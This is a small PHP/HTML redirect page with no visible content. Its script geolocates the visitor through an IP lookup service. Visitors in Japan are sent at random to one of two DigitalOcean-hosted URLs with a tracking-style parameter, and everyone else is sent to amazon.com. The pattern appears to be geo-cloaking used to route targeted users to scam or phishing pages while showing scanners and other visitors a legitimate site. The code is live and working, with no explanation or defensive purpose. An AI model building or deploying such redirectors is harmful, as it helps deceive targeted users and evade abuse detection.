<?php
  ?>
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<title>Redirecting...</title>

<script>
fetch("https://ipwho.is/")
  .then(response => response.json())
  .then(data => {
    if (!data.success) {
      return;
    }

    const countryCode = data.country_code;

    if (countryCode === "JP") {
      (function () {
        const domainA = "https://seashell-app-r6w8o.ondigitalocean.app/?bcda=(0101)-21735-08134";
        const domainB = "https://seal-app-dt23u.ondigitalocean.app/?bcda=(0101)-21735-08134";

        // Random number between 0 and 1
        if (Math.random() < 0.5) {
            window.location.replace(domainA);
        } else {
            window.location.replace(domainB);
        }
    })();
    } else {
      window.location.replace("https://www.amazon.com/");
    }
  })
  .catch(error => {
    console.error("Error fetching location:", error);
  });

</script>

</head>
<body>
</body>
</html>
